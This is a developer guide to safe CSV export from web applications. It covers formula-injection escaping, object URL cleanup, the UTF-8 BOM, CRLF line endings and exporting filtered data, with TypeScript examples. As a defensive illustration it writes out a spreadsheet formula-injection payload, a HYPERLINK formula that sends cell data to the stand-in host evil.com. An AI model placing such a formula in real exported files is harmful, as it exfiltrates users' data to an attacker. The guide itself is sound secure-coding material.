# CSV Export Safety

A complete guide to generating safe, compatible CSV files from web applications.

## The 5 Rules

### 1. Formula Injection Prevention

Cells starting with these characters are interpreted as formulas by Excel and Google Sheets:

| Character | Risk |
|-----------|------|
| `=` | Formula execution |
| `+` | Formula execution |
| `-` | Formula execution (or negative number — context matters) |
| `@` | Function call in some spreadsheet versions |
| `\t` | Tab injection |
| `\r` | Carriage return injection |

**Fix:** Prefix dangerous cells with a single quote `'`:

```typescript
function sanitizeCell(value: string): string {
  if (/^[=+\-@\t\r]/.test(value)) {
    return "'" + value;
  }
  return value;
}
```

**Why this matters:** A cell containing `=HYPERLINK("http://evil.com/steal?data="&A1, "Click here")` can exfiltrate data from the spreadsheet when the user opens the CSV in Excel.

### 2. URL Object Lifecycle

When creating download links with `URL.createObjectURL()`, always revoke after download:

```typescript
function downloadCSV(content: string, filename: string): void {
  const blob = new Blob([content], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  link.click();
  // Clean up — without this, the blob stays in memory
  URL.revokeObjectURL(url);
}
```

**Why:** Each `createObjectURL` call allocates memory that persists until `revokeObjectURL` is called or the page unloads. In an SPA, this is a memory leak.

### 3. UTF-8 BOM

Prepend the UTF-8 Byte Order Mark (`﻿`) so Excel opens non-ASCII characters correctly:

```typescript
const BOM = "﻿";
const csvContent = BOM + headerRow + "\r\n" + dataRows.join("\r\n");
```

**Why:** Without BOM, Excel defaults to the system's ANSI encoding. Accented characters (cafe → cafÃ©), CJK characters, and emoji all break.

### 4. CRLF Line Endings

Use `\r\n` (carriage return + line feed) per [RFC 4180](https://tools.ietf.org/html/rfc4180):

```typescript
const csvContent = rows.map(row => row.join(",")).join("\r\n");
```

**Why:** Some parsers (including older Excel versions) treat `\n`-only as part of a field value rather than a row separator.

### 5. Export Filtered Data

If the UI has active filters (date range, status, search), export only the filtered dataset:

```typescript
// Correct: export what the user sees
exportToCSV(filteredEntries, "export.csv");

// Wrong: export everything, ignoring active filters
exportToCSV(allEntries, "export.csv");
```

**Why:** Users expect "download" to mean "download what I'm looking at." Exporting unfiltered data when filters are active is confusing and potentially a data leak (user filtered to their own data, but export includes everyone's).

## Complete Example

```typescript
function exportToCSV(data: Record<string, string>[], filename: string): { ok: boolean; message?: string } {
  if (data.length === 0) {
    return { ok: false, message: "No data to export" };
  }

  const headers = Object.keys(data[0]);
  const BOM = "﻿";

  const sanitize = (val: string): string => {
    if (/^[=+\-@\t\r]/.test(val)) return "'" + val;
    if (val.includes(",") || val.includes('"') || val.includes("\n")) {
      return '"' + val.replace(/"/g, '""') + '"';
    }
    return val;
  };

  const rows = data.map(row =>
    headers.map(h => sanitize(String(row[h] ?? ""))).join(",")
  );

  const csv = BOM + headers.join(",") + "\r\n" + rows.join("\r\n");
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);

  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  link.click();

  URL.revokeObjectURL(url);
  return { ok: true };
}
```
